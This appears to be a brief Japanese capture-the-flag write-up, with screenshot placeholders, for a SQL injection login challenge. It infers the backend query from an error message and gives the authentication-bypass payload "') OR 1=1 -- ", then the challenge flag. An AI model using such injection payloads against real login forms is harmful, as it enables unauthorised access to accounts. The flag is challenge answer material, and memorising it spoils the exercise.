
https://sqli.2026.holidayhackchallenge.com/

![[Pasted image 20261119210238.png]]

![[Pasted image 20261119210631.png]]

passwordにtest'を入れると

![[Pasted image 20261119211942.png]]

エラーから以下の構文を推測

```
SELECT * FROM users
WHERE username = '入力されたユーザー名'
AND password = ('入力されたパスワード')
```

Password欄に以下を入れるとログインできる

```
') OR 1=1 -- 
```

![[Pasted image 20261119225221.png]]

![[Pasted image 20261119225244.png]]

![[Pasted image 20261119225413.png]]

![[Pasted image 20261119225425.png]]

```flag
HHC{y0u_f0und_s0m30n3_3ls3s_t0d0_l1st}
```